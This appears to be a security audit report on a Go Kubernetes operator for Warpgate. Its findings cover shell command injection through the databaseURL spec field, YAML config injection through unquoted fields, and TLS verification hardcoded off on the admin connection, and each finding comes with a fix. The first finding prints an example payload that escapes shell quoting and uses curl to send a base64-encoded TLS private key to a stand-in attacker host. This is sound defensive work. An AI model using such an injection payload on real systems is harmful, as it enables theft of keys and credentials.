summary: Reviewed the warpgate-operator Go codebase in scope (internal/, cmd/, api/): the Warpgate REST client, all CRD controllers (connection, user, ticket, credentials, instance, HTTPRoute watcher), the admission webhooks and the manager entrypoint. Overall the operator uses crypto/rand for generated passwords, parameterizes nothing into SQL, and ships a standard kubebuilder metrics/webhook setup. The notable risks are in the WarpgateInstance controller, which assembles a shell init script and a YAML config from unvalidated spec strings, and hardcodes TLS verification off for the operator-to-Warpgate admin connection. Impact is bounded by the fact that creating a WarpgateInstance already lets a user set an arbitrary container image, but the injection and transport-security flaws are real and reachable.

findings.title: OS command injection via WarpgateInstance spec.databaseURL in the init-container shell script
findings.description: WarpgateInstanceReconciler.buildDeployment builds the init container's setup command by string-concatenating the user-controlled spec field DatabaseURL directly into a shell command, which is then run with Command: ["/bin/sh", "-c", initScript] (line 776). The value is only wrapped in double quotes, so a DatabaseURL such as `x"; curl https://attacker/$(cat /data/tls.key.pem | base64); echo "` breaks out of the quotes and runs arbitrary shell in the init container, which has the Warpgate ADMIN_PASSWORD secret in its environment (lines 778-790), allowing credential/key exfiltration. The admission webhook (api/v1alpha1/warpgateinstance_webhook.go validateWarpgateInstance) never checks DatabaseURL for shell metacharacters; it only emits an informational warning. Anyone with RBAC to create or update WarpgateInstance objects (or any automation that templates an attacker-influenced DB URL into that field) reaches this sink.
findings.evidence: Line 556-558: `if inst.Spec.DatabaseURL != "" { setupCmd += fmt.Sprintf(" --database-url \"%s\"", inst.Spec.DatabaseURL) }` -> setupCmd is joined into initScript (line 611) -> run as `Command: []string{"/bin/sh", "-c", initScript}` (line 776). ADMIN_PASSWORD is exported into the same container via SecretKeyRef (lines 779-789). No sanitization of DatabaseURL in the validating webhook.
findings.recommendation: Do not interpolate spec strings into a shell script. Pass DatabaseURL to the warpgate binary as a discrete argv element (e.g. build the init command as an exec-form argument list rather than a `/bin/sh -c` string), or inject it via an environment variable referenced with proper quoting. If a shell must be used, strictly validate DatabaseURL against an allow-list (scheme + host:port + db name) in the admission webhook and reject shell metacharacters.

findings.title: YAML config injection via unquoted external_host / database_url in buildWarpgateConfig
findings.description: buildWarpgateConfig writes the user-controlled spec.ExternalHost into the generated warpgate.yaml ConfigMap with an unquoted printf (`external_host: %s`), and spec.DatabaseURL with only naive double-quoting (line 345). Neither field is validated by the webhook. An ExternalHost value containing a newline (e.g. "host\nrecordings:\n  enable: false") injects arbitrary top-level Warpgate configuration directives into the generated config, letting a WarpgateInstance author override security-relevant settings the operator intended to control. DatabaseURL containing a double quote or newline can likewise corrupt or inject into the YAML.
findings.evidence: Line 379-381: `if inst.Spec.ExternalHost != "" { fmt.Fprintf(&b, "external_host: %s\n", inst.Spec.ExternalHost) }` and line 344-346: `fmt.Fprintf(&b, "database_url: \"%s\"\n", inst.Spec.DatabaseURL)`. Output is stored verbatim as the warpgate.yaml ConfigMap (ensureConfigMap, lines 401-403). No validation of these fields in validateWarpgateInstance.
findings.recommendation: Marshal the config with a real YAML encoder (e.g. sigs.k8s.io/yaml or gopkg.in/yaml.v3) so values are safely quoted/escaped, instead of hand-building YAML with fmt.Fprintf. Additionally validate ExternalHost as a hostname and reject control characters in the admission webhook.

findings.title: TLS verification hardcoded off for operator-to-Warpgate admin connection carrying admin credentials
findings.description: When the operator auto-creates the WarpgateConnection for an instance, it sets InsecureSkipVerify: true unconditionally. The resulting client (internal/warpgate/client.go NewClient, lines 54-59) disables certificate verification entirely, and this connection authenticates to the Warpgate admin API with the admin username/password copied into the auth Secret (lines 1085-1088). A pod able to intercept in-cluster traffic (ARP/DNS spoofing, a compromised sidecar or CNI position) to the <instance>-http Service can present any certificate, man-in-the-middle the admin login, and capture the Warpgate admin credentials. Even though the in-cluster certificate is self-signed, verification could instead pin the operator-managed CA/cert rather than being switched off.
findings.evidence: Lines 1109-1113: `conn.Spec = warpgatev1alpha1.WarpgateConnectionSpec{ Host: host, AuthSecretRef: ...{Name: authSecretName}, InsecureSkipVerify: true, // self-signed cert within cluster }`. The admin password is placed in authSecret.Data["password"] at lines 1085-1088. In client.go, InsecureSkipVerify true sets &tls.Config{InsecureSkipVerify: true} (lines 55-59).
findings.recommendation: When cert-manager or an operator-generated self-signed cert is used, mount/trust that CA and verify against it (set RootCAs / ServerName) instead of InsecureSkipVerify. Prefer token-based auth over sending the admin password, and avoid disabling verification on a channel that carries admin credentials.
